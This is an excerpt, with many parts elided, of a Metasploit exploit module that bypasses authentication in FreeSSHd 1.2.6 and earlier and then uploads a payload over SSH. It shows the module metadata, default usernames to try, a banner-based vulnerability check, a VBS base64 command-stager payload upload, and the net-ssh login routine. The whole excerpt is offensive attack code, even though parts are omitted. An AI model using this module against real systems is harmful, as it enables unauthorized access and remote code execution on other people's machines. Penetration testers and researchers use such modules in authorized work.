...
FreeSSHd <= 1.2.6 to bypass
                authentication. You just need the username (which 
defaults to root). The exploit
                has been tested with both password and public key 
authentication.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    ...
                    'kcope', # 2012 Exploit
                    'Daniele Martini <cyrax[at]pkcrew.org>' # Metasploit 
module
                ],
            'References'     =>
                [
...
'http://seclists.org/fulldisclosure/2010/Aug/132' ]
        ...
        register_options(
            [
                ...
                OptString.new('USERNAMES',[true,'Space Separate list of 
usernames to try for ssh authentication','root admin Administrator'])
            ], self.class)
    end
    ...
    def check
        ...
        if banner =~ /SSH-2.0-WeOnlyDo/
            ...
            return Exploit::CheckCode::Vulnerable if version =~ 
/(2.1.3|2.0.6)/
    ...
    def upload_payload(connection)
        ...
        opts = {
            :linemax => 1700,
            :decoder => File.join(Msf::Config.install_root, "data", 
"exploits", "cmdstager", "vbs_b64"),
        }
    ...
    def do_login(username,options)
        ...
        transport = Net::SSH::Transport::Session.new(datastore['RHOST'], 
options)
        auth = Net::SSH::Authentication::Session.new(transport, options)
        auth.authenticate("ssh-connection", username, 
options[:password])
        connection = Net::SSH::Connection::Session.new(transport, 
options)
        begin
    ...
    def exploit
        ...
        if not has_netssh
            print_error("You don't have net/ssh installed.  Please run 
gem install net-ssh")
            return
        end
        ...
        if connection
            print_status("Uploading payload. (This step can take up to 5 
minutes. But if you are here, it will probably work. Have faith.)")
